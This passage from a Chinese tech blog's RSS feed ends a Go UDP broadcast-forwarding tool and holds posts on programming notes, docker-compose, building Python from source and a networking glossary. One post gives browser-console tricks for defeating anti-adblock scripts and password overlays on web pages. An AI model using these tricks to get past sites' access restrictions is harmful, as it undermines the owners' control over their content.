class="keyword">case</span> layers.LayerTypeIPv6:</span><br><span class="line"><span class="keyword">if</span> !ip6Lyr.DstIP.IsMulticast() &#123;</span><br><span class="line"><span class="keyword">goto</span> endPacket</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> layers.LayerTypeUDP:</span><br><span class="line">packet.SrcPort = <span class="type">int</span>(udpLyr.SrcPort)</span><br><span class="line">packet.DstPort = <span class="type">int</span>(udpLyr.DstPort)</span><br><span class="line">packet.Payload = payload.LayerContents()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> packet.SrcPort &gt; <span class="number">0</span> &amp;&amp; packet.DstPort != <span class="number">53</span> &amp;&amp; packet.DstPort != <span class="number">5353</span> &#123;</span><br><span class="line">packets &lt;- &amp;packet</span><br><span class="line">&#125;</span><br><span class="line">endPacket:</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">send</span><span class="params">(ctx context.Context, srcIP, dstIP net.IP)</span></span> &#123;</span><br><span class="line">log.Println(<span class="string">&quot;send start&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> &lt;-ctx.Done():</span><br><span class="line">log.Println(<span class="string">&quot;send stop&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"><span class="keyword">case</span> packet := &lt;-packets:</span><br><span class="line">laddr := &amp;net.UDPAddr&#123;IP: srcIP, Port: packet.SrcPort&#125;</span><br><span class="line">raddr := &amp;net.UDPAddr&#123;IP: dstIP, Port: packet.DstPort&#125;</span><br><span class="line">conn, err := net.DialUDP(<span class="string">&quot;udp&quot;</span>, laddr, raddr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Printf(<span class="string">&quot;falied dial udp from %v to %v \n&quot;</span>, laddr, raddr)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> _, err := conn.Write(packet.Payload); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Printf(<span class="string">&quot;send %d bytes from %v to %v failed \n&quot;</span>, <span class="built_in">len</span>(packet.Payload), laddr, raddr)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">log.Printf(<span class="string">&quot;send packet from %v to %v success \n&quot;</span>, laddr, raddr)</span><br><span class="line">&#125;</span><br><span class="line">conn.Close()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">display</span><span class="params">()</span></span> &#123;</span><br><span class="line">devs, err := pcap.FindAllDevs()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatal(<span class="string">&quot;failed to find interface, &quot;</span>, err.Error())</span><br><span class="line">&#125;</span><br><span class="line">str := <span class="function"><span class="keyword">func</span><span class="params">(addrs []pcap.InterfaceAddress)</span></span> <span class="type">string</span> &#123;</span><br><span class="line"><span class="keyword">var</span> result []<span class="type">string</span></span><br><span class="line"><span class="keyword">for</span> _, v := <span class="keyword">range</span> addrs &#123;</span><br><span class="line">result = <span class="built_in">append</span>(result, v.IP.String())</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> strings.Join(result, <span class="string">&quot;, &quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> _, dev := <span class="keyword">range</span> devs &#123;</span><br><span class="line">log.Printf(<span class="string">&quot;%s: [%v]&quot;</span>, dev.Name, str(dev.Addresses))</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">flag.Parse()</span><br><span class="line">ctx, cancel := context.WithCancel(context.Background())</span><br><span class="line"><span class="keyword">if</span> *showIface &#123;</span><br><span class="line">display()</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">srcIP := net.ParseIP(*from)</span><br><span class="line">dstIP := net.ParseIP(*to)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(dstIP) == <span class="number">0</span> || <span class="built_in">len</span>(srcIP) == <span class="number">0</span> &#123;</span><br><span class="line">log.Fatal(<span class="string">&quot;invalid dst or src ip&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">log.Printf(<span class="string">&quot;iface: %s, from: %s, to: %s&quot;</span>, *iface, srcIP.String(), dstIP.String())</span><br><span class="line"><span class="keyword">go</span> capture(ctx, *iface)</span><br><span class="line"><span class="keyword">go</span> send(ctx, srcIP, dstIP)</span><br><span class="line"></span><br><span class="line">quit := <span class="built_in">make</span>(<span class="keyword">chan</span> os.Signal, <span class="number">1</span>)</span><br><span class="line">signal.Notify(quit, syscall.SIGTERM, syscall.SIGINT)</span><br><span class="line">&lt;-quit</span><br><span class="line">cancel()</span><br><span class="line">time.Sleep(time.Second)</span><br><span class="line">log.Println(<span class="string">&quot;exit.&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      <category domain="https://xchens.cn/tags/game/">game</category>
      
      <category domain="https://xchens.cn/tags/network/">network</category>
      
      <category domain="https://xchens.cn/tags/wireguard/">wireguard</category>
      
      
      <comments>https://xchens.cn/posts/1d434264/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>「 程序员修炼之道 」</title>
      <link>https://xchens.cn/posts/208f0b83/</link>
      <guid>https://xchens.cn/posts/208f0b83/</guid>
      <pubDate>Fri, 15 Oct 2021 04:20:00 GMT</pubDate>
      
        
        
      <description>&lt;h3 id=&quot;1-专注&quot;&gt;&lt;a href=&quot;#1-专注&quot; class=&quot;headerlink&quot; title=&quot;1. 专注&quot;&gt;&lt;/a&gt;1. 专注&lt;/h3&gt;&lt;p&gt;对于所做的事情保持足够的专注&lt;/p&gt;
&lt;h3 id=&quot;2-思考&quot;&gt;&lt;a href=&quot;#2-思考&quot; class=&quot;head</description>
        
      
      
      
      <content:encoded><![CDATA[<h3 id="1-专注"><a href="#1-专注" class="headerlink" title="1. 专注"></a>1. 专注</h3><p>对于所做的事情保持足够的专注</p><h3 id="2-思考"><a href="#2-思考" class="headerlink" title="2. 思考"></a>2. 思考</h3><p>想明白自己在做什么，想清楚自己真正的目的</p><h3 id="3-预设更多可能，而非事后找借口"><a href="#3-预设更多可能，而非事后找借口" class="headerlink" title="3. 预设更多可能，而非事后找借口"></a>3. 预设更多可能，而非事后找借口</h3><p>项目之初与进行中总是需要更多的思考项目走向，考虑更多的可能性<br>（如果你遇到银行柜员或修理工在出现问题时给了蹩脚的借口，你会如何看待对方及其背后的公司）</p><h3 id="4-防微杜渐-避免破窗效应"><a href="#4-防微杜渐-避免破窗效应" class="headerlink" title="4. 防微杜渐 - 避免破窗效应"></a>4. 防微杜渐 - 避免破窗效应</h3><p>任何项目之初都要保持敬畏，避免任何不负责任的设计与实现，努力维护其「优雅度」  </p><p>当项目足够优雅后，任何人都不会舍得破坏这样的艺术；相反，对于一个混乱的项目，<br>没人愿意花太多时间去改善一个垃圾，即使新增功能也是强行为之，这只会加剧项目的「熵」。</p><h3 id="5-催生变化，推进变化"><a href="#5-催生变化，推进变化" class="headerlink" title="5. 催生变化，推进变化"></a>5. 催生变化，推进变化</h3><blockquote><p>设计出你可以合理要求的东西，好好开发它。一旦完成，就拿给大家看，让他们大吃一惊。然后说：“要是我们增加……可能就会更好。”假装那并不重要。坐回椅子上，等着他们开始要你增加你本来就想要的功能。人们发现，参与正在发生的成功要更容易。让他们瞥见未来，你就能让他们聚集在你周围。</p></blockquote><p>创造一件事物总是十分困难的，而因势利导，循序渐进则会顺利得多。 </p><p><strong>「note：让人们相信正在发生的“成功”，让他们主动聚集过来」</strong></p><h3 id="6-心怀远景"><a href="#6-心怀远景" class="headerlink" title="6. 心怀远景"></a>6. 心怀远景</h3><p>期待并朝着长期价值前进</p><p>其一，远大目标是前进的标杆，只有心里清楚未来，才能靠近未来；<br>其二，温水煮青蛙，不去看远处的风险，便只能做一只煮熟的青蛙。  </p><h3 id="7-质量问题是需求，而非核心"><a href="#7-质量问题是需求，而非核心" class="headerlink" title="7. 质量问题是需求，而非核心"></a>7. 质量问题是需求，而非核心</h3><blockquote><p>技术陷阱：技术出身的项目管理者往往会把技术当作第一要素，而导致需求与市场脱节</p></blockquote><p>项目进展中，质量并不总是作为第一需求，需要根据实际需求动态调整。<br>用户有时宁愿用一些功能完善的残次品，也不愿等待一个打磨中的半成品。</p><p>不要因为过度修饰和过于求精而毁损完好的程序。它也许不完美，但不用担心：它不可能完美。</p><p><strong>「note：以用户角度去权衡需求」</strong> </p><h3 id="8-知识资产管理"><a href="#8-知识资产管理" class="headerlink" title="8. 知识资产管理"></a>8. 知识资产管理</h3><blockquote><p>作为技术从业者，我们立足的根基不是位置，而是知识</p></blockquote><p>知识投资要点：定期投资，多元化，定期重新评估与平衡，尽量选择最有价值的知识</p><hr><p>TODO： more</p>]]></content:encoded>
      
      
      
      <category domain="https://xchens.cn/tags/%E7%AC%94%E8%AE%B0/">笔记</category>
      
      <category domain="https://xchens.cn/tags/%E9%98%85%E8%AF%BB/">阅读</category>
      
      
      <comments>https://xchens.cn/posts/208f0b83/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>docker-compose 示例</title>
      <link>https://xchens.cn/posts/67b55fb6/</link>
      <guid>https://xchens.cn/posts/67b55fb6/</guid>
      <pubDate>Tue, 24 Aug 2021 03:07:00 GMT</pubDate>
      
      <description>docker-compose 基础使用方法示例，包含常用参数配置等信息</description>
      
      
      
      <content:encoded><![CDATA[<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><blockquote><p>包含一些常用的参数配置</p></blockquote><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&quot;3.9&quot;</span>  <span class="comment"># optional since v1.27.0</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">web:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span> <span class="comment"># 从当前路径开始构建docker镜像，要求有 Dockerfile</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;80:5000&quot;</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">.:/code</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">logvolume01:/var/log</span></span><br><span class="line">    <span class="attr">links:</span> <span class="comment"># 定义与其他服务的网络连接</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">redis</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">redis:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">redis</span> <span class="comment"># 使用本地最新的 redis 镜像</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">redis-hahah</span> <span class="comment"># 自定义容器启动后的名称</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">&quot;unless-stopped&quot;</span> <span class="comment"># https://www.cloudbees.com/blog/ensuring-containers-are-always-running-with-dockers-restart-policy</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;$&#123;EXT_PORT&#125;:6379&quot;</span> <span class="comment"># 使用环境变量设置端口映射</span></span><br><span class="line">    <span class="attr">environment:</span> <span class="comment"># 传递给内部容器的环境变量</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">ROOT_USER=$&#123;USERNAME&#125;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">ROOT_PASSWORD=$&#123;PASSWORD&#125;</span></span><br><span class="line">    <span class="attr">env_file:</span> <span class="comment"># 文件里包含了传递给内部容器的环境变量</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">../../conf.env</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">$&#123;PWD&#125;/data:/data</span> <span class="comment"># 挂载卷</span></span><br></pre></td></tr></table></figure><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><ul><li>.env</li></ul><blockquote><p>类似于bash语法，支持注释</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 环境变量配置， docker-compose 解析时生效，无法直接作用于容器内</span></span><br><span class="line">USERNAME=admin    <span class="comment"># 用户名</span></span><br><span class="line">PASSWORD=password <span class="comment"># 密码</span></span><br><span class="line">WORK_DIR=/tmp     <span class="comment"># 目录</span></span><br><span class="line">EXT_PORT=6666     <span class="comment"># 端口号</span></span><br></pre></td></tr></table></figure><ul><li>创建启动</li></ul><blockquote><p>docker-compose up -d</p></blockquote><ul><li>停止删除</li></ul><blockquote><p>docker-compose down</p></blockquote>]]></content:encoded>
      
      
      
      <category domain="https://xchens.cn/tags/tool/">tool</category>
      
      
      <comments>https://xchens.cn/posts/67b55fb6/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>知识自由小技巧</title>
      <link>https://xchens.cn/posts/75c80efa/</link>
      <guid>https://xchens.cn/posts/75c80efa/</guid>
      <pubDate>Thu, 01 Jul 2021 10:46:47 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;知识自由&quot;&gt;&lt;a href=&quot;#知识自由&quot; class=&quot;headerlink&quot; title=&quot;知识自由&quot;&gt;&lt;/a&gt;知识自由&lt;/h2&gt;&lt;p&gt;互联网精神的核心应该是知识共享。&lt;/p&gt;
&lt;p&gt;这里介绍一些走向知识自由的技巧。&lt;/p&gt;
&lt;h2 id=&quot;Trick&quot;&gt;&lt;a</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="知识自由"><a href="#知识自由" class="headerlink" title="知识自由"></a>知识自由</h2><p>互联网精神的核心应该是知识共享。</p><p>这里介绍一些走向知识自由的技巧。</p><h2 id="Trick"><a href="#Trick" class="headerlink" title="Trick"></a>Trick</h2><h3 id="1-开启网页可编辑"><a href="#1-开启网页可编辑" class="headerlink" title="1. 开启网页可编辑"></a>1. 开启网页可编辑</h3><blockquote><p>让网页上的任意内容变得易于修改和复制</p></blockquote><p>打开控制台 -&gt; 在 console 里执行：  </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 以下两个命令效果几乎一样，选择任一个即可</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">contentEditable</span>=<span class="literal">true</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">designMode</span>=<span class="string">&#x27;on&#x27;</span>;</span><br></pre></td></tr></table></figure><h3 id="2-开启右键点击"><a href="#2-开启右键点击" class="headerlink" title="2. 开启右键点击"></a>2. 开启右键点击</h3><blockquote><p>禁用「禁用右键」</p></blockquote><p>打开控制台 -&gt; 在 console 里执行：  </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">oncontextmenu</span>=<span class="literal">null</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">oncontextmenu</span>=<span class="literal">null</span></span><br></pre></td></tr></table></figure><p>若不生效，可能是在其他 div 上禁用了右键。可以通过禁用 JavaScript 解决。</p><h3 id="3-禁用浏览器-JavaScript-运行"><a href="#3-禁用浏览器-JavaScript-运行" class="headerlink" title="3. 禁用浏览器 JavaScript 运行"></a>3. 禁用浏览器 JavaScript 运行</h3><blockquote><p>究极大法：可以绕过所有 code trick</p></blockquote><p>打开控制台（审查元素）-&gt; 打开设置 -&gt; Preferences -&gt; Debugger -&gt; 勾选「Disable JavaScirpt」</p><p>注意在网页加载完成后禁用，避免网页渲染不完整。</p><h3 id="4-禁止加载-JavaScript-资源"><a href="#4-禁止加载-JavaScript-资源" class="headerlink" title="4. 禁止加载 JavaScript 资源"></a>4. 禁止加载 JavaScript 资源</h3><blockquote><p>有的 JavaScript 生来就是捣乱的</p></blockquote><p>打开控制台（审查元素）-&gt; NetWork -&gt; 找到需要屏蔽的 js 资源 -&gt; 右键后点击 「block request URL」-&gt; 最后刷新网页</p><h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h2><blockquote><p>每个人都有保护自己版权的权利，请尊重他人的前提下使用</p></blockquote><h3 id="1-绕过「广告屏蔽识别」"><a href="#1-绕过「广告屏蔽识别」" class="headerlink" title="1. 绕过「广告屏蔽识别」"></a>1. 绕过「广告屏蔽识别」</h3><p>有的网站会检测自己的广告是否加载，当广告加载失败后会用js删除网页内容</p><p>这类一般都是通过引入单独的js资源实现，并不会嵌入到每个网页中，所以只要找到这个 js 并拦截即可</p><p>或者手快一点，在页面加载完成后立即禁用 js</p><h3 id="2-阅读带密码网页"><a href="#2-阅读带密码网页" class="headerlink" title="2. 阅读带密码网页"></a>2. 阅读带密码网页</h3><p>这类网页的情况比较复杂，需要分别讨论</p><p>a. 在网页顶层套了一个输入密码的 div ，阻止观看  </p><p>打开<code>浏览器控制台</code>，选中对应 div，删除即可</p><p>b. 通过js加载密码模块</p><p>查看js，选中并右键拦截，刷新网页后即可</p><p>c. 套了div，并有 js 循环生成，或者其他更复杂的情况</p><p>阻止相关 js 加载，然后等页面渲染完成后禁用 js 运行，最后再删除 div</p><hr><p>原创不易，转载请注明来源 xchens.cn</p>]]></content:encoded>
      
      
      
      <category domain="https://xchens.cn/tags/tricks/">tricks`</category>
      
      
      <comments>https://xchens.cn/posts/75c80efa/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>linux如何从源码安装纯净版python3</title>
      <link>https://xchens.cn/posts/fd58792a/</link>
      <guid>https://xchens.cn/posts/fd58792a/</guid>
      <pubDate>Mon, 10 May 2021 10:51:57 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;编译安装纯净python3，不干扰已存在的任何版本python&quot;&gt;&lt;a href=&quot;#编译安装纯净python3，不干扰已存在的任何版本python&quot; class=&quot;headerlink&quot; title=&quot;编译安装纯净python3，不干扰已存在的任何版本pytho</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="编译安装纯净python3，不干扰已存在的任何版本python"><a href="#编译安装纯净python3，不干扰已存在的任何版本python" class="headerlink" title="编译安装纯净python3，不干扰已存在的任何版本python"></a>编译安装纯净python3，不干扰已存在的任何版本python</h1><h2 id="安装依赖库"><a href="#安装依赖库" class="headerlink" title="安装依赖库"></a>安装依赖库</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 基于apt的系统 (如 Debian, Ubuntu, Mint)</span><br><span class="line">sudo apt-get install -y make build-essential libssl-dev zlib1g-dev \</span><br><span class="line">       libbz2-dev libreadline-dev libsqlite3-dev wget curl llvm \</span><br><span class="line">       libncurses5-dev libncursesw5-dev xz-utils tk-dev</span><br><span class="line"></span><br><span class="line"># 基于yum的系统 (如 CentOS)</span><br><span class="line">sudo yum -y install gcc openssl-devel bzip2-devel libffi-devel</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="准备python源码"><a href="#准备python源码" class="headerlink" title="准备python源码"></a>准备python源码</h2><p>在 <code>https://www.python.org/downloads/</code> 找到合适的版本并下载源码</p><h2 id="编译安装"><a href="#编译安装" class="headerlink" title="编译安装"></a>编译安装</h2><blockquote><p>以 <code>python 3.9.5</code> 为例。</p></blockquote><p>执行源码包下载及编译安装流程，请确保网络状况良好</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">目标安装位置，修改此变量以安装到其他位置</span></span><br><span class="line">PYTHON395=/usr/local/python395</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载 python 3.9.5</span></span><br><span class="line">wget https://www.python.org/ftp/python/3.9.5/Python-3.9.5.tgz</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">解压源码包到当前路径下</span></span><br><span class="line">tar xvf Python-3.9.5.tgz</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进入源码目录</span></span><br><span class="line">cd Python-3.9.5</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置编译选项</span></span><br><span class="line">./configure --enable-optimizations --with-ensurepip=install --prefix=$&#123;PYTHON395&#125;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">多线程编译</span></span><br><span class="line">make -j 8</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">完整安装：修改系统python3指向自己</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">sudo make install</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">绿色安装: 不改变系统环境，仅将编译后的结果安装到目标位置下</span></span><br><span class="line">sudo make altinstall </span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="FAQ"><a href="#FAQ" class="headerlink" title="FAQ"></a>FAQ</h2><h3 id="1-下载安装包失败"><a href="#1-下载安装包失败" class="headerlink" title="1. 下载安装包失败?"></a>1. 下载安装包失败?</h3><p>删除已下载的文件，并在检查网络后重试。</p><h3 id="2-编译过程失败？"><a href="#2-编译过程失败？" class="headerlink" title="2. 编译过程失败？"></a>2. 编译过程失败？</h3><p>尝试去掉 <code>--enable-optimizations</code> 选项并重新配置编译安装</p><h3 id="3-安装过程没有权限？"><a href="#3-安装过程没有权限？" class="headerlink" title="3. 安装过程没有权限？"></a>3. 安装过程没有权限？</h3><p>安装过程是绿色可靠的，之所以上述代码在安装时仍然使用了sudo，<br>但这只是将程序安装到 <code>/usr/local/</code> 目录下所必需的。<br>把安装目标位置修改为其他存在权限的目录下，可以去掉 <code>sudo</code> 操作。</p><h3 id="4-CentOS-编译时仍然提示缺少依赖？"><a href="#4-CentOS-编译时仍然提示缺少依赖？" class="headerlink" title="4. CentOS 编译时仍然提示缺少依赖？"></a>4. CentOS 编译时仍然提示缺少依赖？</h3><p>尝试： <code>sudo yum -y groupinstall &quot;Development Tools&quot;</code> ，<br>然后使用 <code>make clean</code> 清理掉编译缓存，接着继续重试配置、编译、安装等操作。</p><h3 id="5-WARNING-The-script-pip3-9-is-installed-in-‘-usr-local-python395-bin’-which-is-not-on-PATH"><a href="#5-WARNING-The-script-pip3-9-is-installed-in-‘-usr-local-python395-bin’-which-is-not-on-PATH" class="headerlink" title="5. WARNING: The script pip3.9 is installed in ‘&#x2F;usr&#x2F;local&#x2F;python395&#x2F;bin’ which is not on PATH."></a>5. WARNING: The script pip3.9 is installed in ‘&#x2F;usr&#x2F;local&#x2F;python395&#x2F;bin’ which is not on PATH.</h3><p>可以忽略。这个只是警告python程序的目录无法被直接找到，可以选择将此路径添加的 PATH 环境变量即可。</p><h3 id="6-WARNING-Running-pip-as-root-will-break-packages-and-permissions-You-should-install-packages-reliably-by-using-venv-https-pip-pypa-io-warnings-venv"><a href="#6-WARNING-Running-pip-as-root-will-break-packages-and-permissions-You-should-install-packages-reliably-by-using-venv-https-pip-pypa-io-warnings-venv" class="headerlink" title="6. WARNING: Running pip as root will break packages and permissions. You should install packages reliably by using venv: https://pip.pypa.io/warnings/venv"></a>6. WARNING: Running pip as root will break packages and permissions. You should install packages reliably by using venv: <a href="https://pip.pypa.io/warnings/venv">https://pip.pypa.io/warnings/venv</a></h3><p>由于在安装步骤我们使用了sudo，导致对应的文件属主都是root，将其修改回来即可。<br>如 <code>sudo chown -R user:group /usr/local/python395</code>。<br>当然也可以选择在配置编译前，指定一个普通用户的安装目录，同时去除掉安装时的 <code>sudo</code> 亦可。   </p><h3 id="7-不需要纯净安装，如何将-python-加入环境变量？"><a href="#7-不需要纯净安装，如何将-python-加入环境变量？" class="headerlink" title="7. 不需要纯净安装，如何将 python 加入环境变量？"></a>7. 不需要纯净安装，如何将 python 加入环境变量？</h3><p>方案一： 在安装时将 <code>sudo make altinstall</code> 替换为 <code>sudo make install</code><br>方案二： 在 <code>~/.bashrc</code> <code>/etc/bashrc</code> 等文件中任一个加入以下语句即可。注意要修改python路径为自己的实际安装路径。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH=$PATH:/usr/local/python395/bin</span><br></pre></td></tr></table></figure><ul><li>注意此时的<code>/usr/local/python395/bin</code>路径下仅有 python3.9 和 pip3.9 等文件，直接终端输入 python3 是无法找到这里的。</li><li>需要将 python3 的符号链接指向这里的 python3.9 才能完成配置。 即 <code>ln -s /usr/local/python395/bin/python3.9 /usr/bin/python3 </code></li></ul>]]></content:encoded>
      
      
      
      <category domain="https://xchens.cn/tags/linux/">linux</category>
      
      <category domain="https://xchens.cn/tags/python3/">python3</category>
      
      
      <comments>https://xchens.cn/posts/fd58792a/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>那些年我们看不懂的缩写 - network,security,and so on.</title>
      <link>https://xchens.cn/posts/f0dba9bd/</link>
      <guid>https://xchens.cn/posts/f0dba9bd/</guid>
      <pubDate>Mon, 10 May 2021 10:00:00 GMT</pubDate>
      
      <description>计算机网络、安全、编程等相关领域可能涉及到的名词缩写介绍</description>
      
      
      
      <content:encoded><![CDATA[<h2 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h2><ul><li><p><code>AP</code> (Access Point)<br>  无线接入点</p></li><li><p><code>STA</code> (Station)<br>  站点，任何一个接入无线AP的设备都可以称为一个站点</p></li><li><p><code>SSID</code> (Service Set Identifier)<br>  每个无线AP都应该有一个标示用于用户识别，SSID就是这个用于用户识别的的名字，也就是我们经常说到的wifi名</p></li><li><p><code>LB</code> (Load Balance) 负载均衡<br>  用于将流量均衡合理地分配到不同机器。 </p></li><li><p><code>CSR</code> (Cerificate Signing Request) 证书请求文件<br>  我们想要证明我们的网站是可信的，数据传输是加密的，我们就需要由第三方CA机构颁发的证书来证明，比如Symantec，GeoTrust等等。<br>  而想要申请这样的证书，我们的第一步就是需要生成我们自己的CSR文件。<br>  CSR需要由申请人提供域名、公司名称、部门、省份、城市、国家借助相关工具生成，工具同时会生成证书请求文件和私钥文件，其中的证书请求文件就是CSR文件，这两个文件是相互匹配的，我们将CSR文件提交给CA申请证书，经过CA身份对申请者身份进行审核后，颁发证书公钥，申请人收到证书文件后，将证书公钥文件配合私钥文件转化成服务器对应的格式的文件部署在HTTP服务器上面，这样我们的网站就可信了。  </p></li><li><p><code>TFO</code> (TCP Fast Open)<br>  它通过握手开始时的SYN包中的TFO cookie（一个TCP选项）来验证一个之前连接过的客户端。如果验证成功，它可以在三次握手最终的ACK包收到之前就开始发送数据，这样便跳过了一个绕路的行为，更在传输开始时就降低了延迟。这个加密的Cookie被存储在客户端，在一开始的连接时被设定好。然后每当客户端连接时，这个Cookie被重复返回。<br>  TCP握手开始时，客户端发送的SYN包带有数据和cookie，服务端会校验此cookie，若cookie合法则视作建立连接成功并将数据返回给上层应用，否则丢弃数据并返回SYN+ACK从而进入TCP第二次握手。客户端根据服务端响应来决定继续TCP握手并重发数据或进入下一步。<br>  <a href="https://zh.wikipedia.org/wiki/TCP%E5%BF%AB%E9%80%9F%E6%89%93%E5%BC%80">更多详情</a> </p></li><li><p>SLD (second-level domain) 二级域名<br>  <a href="http://www.example.com中,example.com就是二级域名/">www.example.com中，example.com就是二级域名</a></p></li></ul><h2 id="安全"><a href="#安全" class="headerlink" title="安全"></a>安全</h2><ul><li><p><code>ROP</code>（Return-Oriented Programming） 面向返回编程<br>  